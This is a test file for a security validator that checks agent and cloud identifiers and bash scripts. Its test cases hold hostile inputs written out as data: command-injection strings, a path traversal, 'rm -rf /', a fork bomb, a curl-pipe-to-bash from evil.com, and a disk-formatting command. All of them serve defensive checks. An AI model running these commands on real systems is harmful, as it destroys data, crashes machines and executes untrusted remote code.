import { describe, it, expect } from "bun:test";
import { validateIdentifier, validateScriptContent } from "../security.js";

describe("Security Validation", () => {
  describe("validateIdentifier", () => {
    it("should accept valid identifiers", () => {
      expect(() => validateIdentifier("claude", "Agent")).not.toThrow();
      expect(() => validateIdentifier("sprite", "Cloud")).not.toThrow();
      expect(() => validateIdentifier("aider-chat", "Agent")).not.toThrow();
      expect(() => validateIdentifier("claude_code", "Agent")).not.toThrow();
      expect(() => validateIdentifier("aws-ec2", "Cloud")).not.toThrow();
    });

    it("should reject empty identifiers", () => {
      expect(() => validateIdentifier("", "Agent")).toThrow("Agent cannot be empty");
      expect(() => validateIdentifier("   ", "Agent")).toThrow("Agent cannot be empty");
    });

    it("should reject identifiers with path traversal", () => {
      expect(() => validateIdentifier("../etc/passwd", "Agent")).toThrow(); // Caught by invalid chars
      expect(() => validateIdentifier("agent/../cloud", "Agent")).toThrow(); // Caught by ".."
      expect(() => validateIdentifier("agent/cloud", "Agent")).toThrow("invalid characters");
    });

    it("should reject identifiers with special characters", () => {
      expect(() => validateIdentifier("agent; rm -rf /", "Agent")).toThrow("invalid characters");
      expect(() => validateIdentifier("agent$(whoami)", "Agent")).toThrow("invalid characters");
      expect(() => validateIdentifier("agent`whoami`", "Agent")).toThrow("invalid characters");
      expect(() => validateIdentifier("agent|cat", "Agent")).toThrow("invalid characters");
      expect(() => validateIdentifier("agent&", "Agent")).toThrow("invalid characters");
    });

    it("should reject uppercase letters", () => {
      expect(() => validateIdentifier("Claude", "Agent")).toThrow("invalid characters");
      expect(() => validateIdentifier("SPRITE", "Cloud")).toThrow("invalid characters");
    });

    it("should reject overly long identifiers", () => {
      const longId = "a".repeat(65);
      expect(() => validateIdentifier(longId, "Agent")).toThrow("exceeds maximum length");
    });
  });

  describe("validateScriptContent", () => {
    it("should accept valid bash scripts", () => {
      const validScript = `#!/bin/bash
echo "Hello, World!"
ls -la
cd /tmp
`;
      expect(() => validateScriptContent(validScript)).not.toThrow();
    });

    it("should reject empty scripts", () => {
      expect(() => validateScriptContent("")).toThrow("Script content is empty");
      expect(() => validateScriptContent("   ")).toThrow("Script content is empty");
    });

    it("should reject scripts without shebang", () => {
      expect(() => validateScriptContent("echo hello")).toThrow("shebang");
    });

    it("should reject dangerous filesystem operations", () => {
      const dangerousScript = `#!/bin/bash
rm -rf /
`;
      expect(() => validateScriptContent(dangerousScript)).toThrow("destructive filesystem operation");
    });

    it("should reject fork bombs", () => {
      const forkBomb = `#!/bin/bash
:(){:|:&};:
`;
      expect(() => validateScriptContent(forkBomb)).toThrow("fork bomb");
    });

    it("should reject nested curl|bash", () => {
      const nestedCurl = `#!/bin/bash
curl http://evil.com/script.sh | bash
`;
      expect(() => validateScriptContent(nestedCurl)).toThrow("nested curl|bash");
    });

    it("should reject filesystem formatting", () => {
      const formatScript = `#!/bin/bash
mkfs.ext4 /dev/sda1
`;
      expect(() => validateScriptContent(formatScript)).toThrow("filesystem formatting");
    });

    it("should accept safe rm commands", () => {
      const safeScript = `#!/bin/bash
rm -rf /tmp/mydir
rm -rf /var/cache/app
`;
      expect(() => validateScriptContent(safeScript)).not.toThrow();
    });
  });
});
